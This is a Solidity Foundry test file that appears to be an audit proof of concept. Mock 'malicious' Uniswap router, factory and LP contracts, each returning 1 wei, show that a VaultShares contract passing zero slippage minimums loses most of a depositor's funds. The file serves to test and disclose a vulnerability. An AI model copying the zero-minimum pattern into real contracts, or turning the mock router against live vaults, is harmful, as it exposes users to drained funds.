// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {VaultShares} from "../../src/protocol/VaultShares.sol";
import {IVaultShares, IVaultData} from "../../src/interfaces/IVaultShares.sol";
import {ERC20Mock} from "../mocks/ERC20Mock.sol";
import {DataTypes} from "../../src/vendor/DataTypes.sol";

// ---------------------------
//        Uniswap mocks
// ---------------------------

contract MaliciousLP is ERC20Mock {
    // Inherit ERC20Mock: free mint/burn helpers already available
}

contract MaliciousFactory {
    address public immutable pair;

    constructor(address pair_) {
        pair = pair_;
    }

    function getPair(address, address) external view returns (address) {
        return pair;
    }
}

contract MaliciousRouter {
    // This router is Uniswap-V2-shaped enough for VaultShares.UniswapAdapter
    // Behavior:
    //  - swapExactTokensForTokens: takes all input, returns *1 wei* as output
    //  - addLiquidity: pulls all desired tokens, mints *1 wei* LP
    //  - removeLiquidity: burns all LP, returns *1 wei* of each token
    // All succeed because min amounts are zero.

    address private _factory;
    MaliciousLP private _lp;

    constructor(address factory_, address lp_) {
        _factory = factory_;
        _lp = MaliciousLP(lp_);
    }

    function factory() external view returns (address) {
        return _factory;
    }

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 /* amountOutMin */, // zero in vulnerable code
        address[] calldata path,
        address to,
        uint256 /* deadline */
    ) external returns (uint256[] memory amounts) {
        // pull input
        ERC20Mock(path[0]).transferFrom(msg.sender, address(this), amountIn);

        // mint or transfer *1 wei* of output to `to`
        // use mint to avoid needing pre-funding
        ERC20Mock(path[1]).mint(1, to);

        amounts = new uint256[](path.length);
        amounts[0] = amountIn; // uniswap-style return
        amounts[1] = 1;
    }

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin, // zero in vulnerable code
        uint256 amountBMin, // zero in vulnerable code
        address to,
        uint256 /* deadline */
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity) {
        // pull all desired tokens from caller
        ERC20Mock(tokenA).transferFrom(
            msg.sender,
            address(this),
            amountADesired
        );
        ERC20Mock(tokenB).transferFrom(
            msg.sender,
            address(this),
            amountBDesired
        );

        // min checks are zero -> always satisfied
        require(amountAMin == 0 && amountBMin == 0, "not the vulnerable path");

        // mint only 1 wei of LP to the vault (terrible deal)
        _lp.mint(1, to);

        return (amountADesired, amountBDesired, 1);
    }

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin, // zero in vulnerable code
        uint256 amountBMin, // zero in vulnerable code
        address to,
        uint256 /* deadline */
    ) external returns (uint256 amountA, uint256 amountB) {
        // take the LP from caller
        _lp.transferFrom(msg.sender, address(this), liquidity);
        // burn
        _lp.burn(liquidity, address(this));

        // return *1 wei* of each token to the vault
        ERC20Mock(tokenA).mint(1, to);
        ERC20Mock(tokenB).mint(1, to);

        require(amountAMin == 0 && amountBMin == 0, "not the vulnerable path");

        return (1, 1);
    }
}

// ---------------------------
//         Aave mocks
// ---------------------------

// Deploy a small MockAavePool that returns (aTokenAddress, 0,0,...)
contract MockAavePool {
    address public immutable aTokenAddr;

    constructor(address _aTokenAddr) {
        aTokenAddr = _aTokenAddr;
    }

    // Must match the interface signature used by VaultShares
    function getReserveData(
        address
    ) external view returns (DataTypes.ReserveData memory r) {
        // leave everything at the zero default, just set aTokenAddress
        r.aTokenAddress = aTokenAddr;
    }

    function supply(
        address /* asset */,
        uint256 amount,
        address onBehalfOf,
        uint16 /* referralCode */
    ) external {
        if (amount > 0) {
            ERC20Mock(aTokenAddr).mint(amount, onBehalfOf);
        }
    }
}

// ---------------------------
//          PoC test
// ---------------------------

contract SlippageZeroMin_PoC_Test is Test {
    VaultShares private vault;
    ERC20Mock private asset;
    ERC20Mock private tokenOne;
    ERC20Mock private mockWETH; // distinct mock WETH
    ERC20Mock private awethTokenMock;

    function setUp() public {
        asset = new ERC20Mock();
        tokenOne = new ERC20Mock();
        mockWETH = new ERC20Mock(); // distinct mock WETH
        awethTokenMock = new ERC20Mock();

        MockAavePool pool = new MockAavePool(address(awethTokenMock));

        // LP + Factory + Router (malicious)
        MaliciousLP lp = new MaliciousLP();
        MaliciousFactory factory = new MaliciousFactory(address(lp));
        MaliciousRouter router = new MaliciousRouter(
            address(factory),
            address(lp)
        );

        // Build constructor data with:
        IVaultShares.ConstructorData memory c = IVaultShares.ConstructorData({
            asset: asset,
            vaultName: "PoC Vault",
            vaultSymbol: "POC",
            guardian: address(this),
            allocationData: IVaultData.AllocationData({
                holdAllocation: 0,
                uniswapAllocation: 1000, // 100% to Uniswap path (will hit vulnerable code)
                aaveAllocation: 0
            }),
            aavePool: address(pool),
            uniswapRouter: address(router),
            guardianAndDaoCut: 100,
            vaultGuardians: address(this),
            weth: address(mockWETH),
            usdc: address(tokenOne)
        });

        vault = new VaultShares(c);

        // Label for nicer traces
        vm.label(address(vault), "VaultShares(POC)");
        vm.label(address(asset), "ASSET");
        vm.label(address(tokenOne), "TOKEN_ONE");
        vm.label(address(factory), "MaliciousFactory");
        vm.label(address(router), "MaliciousRouter");
        vm.label(address(lp), "MaliciousLP");
    }

    function test_Slippage_WithZeroMins_LosesValue() public {
        // User mints and deposits 100 ASSET
        address user = address(0xBEEF);
        uint256 depositAmt = 100 ether;

        asset.mint(depositAmt, user);

        // pre-fund the vault so the double-accounting won't cause insufficient balance
        // this must happen after vault creation (setUp) but before deposit triggers invest()
        asset.mint(depositAmt / 2, address(vault));

        // Approve & deposit
        vm.startPrank(user);
        asset.approve(address(vault), depositAmt);
        uint256 shares = vault.deposit(depositAmt, user);
        vm.stopPrank();

        // Full redeem immediately – vulnerable paths:
        //  - invest: swap with amountOutMin=0, addLiquidity with amountAMin/BMin=0
        //  - redeem: removeLiquidity with amountAMin/BMin=0, swap with amountOutMin=0
        vm.startPrank(user);
        uint256 assetsOut = vault.redeem(vault.balanceOf(user), user, user);
        vm.stopPrank();

        // Show the damage in logs
        console.log("Deposit:", depositAmt);
        console.log("Shares minted:", shares);
        console.log("Assets out on full redeem:", assetsOut);

        // Assert a large loss -> 10x
        assertLt(
            assetsOut,
            depositAmt / 10,
            "Expected significant loss due to zero slippage protections"
        );
    }
}
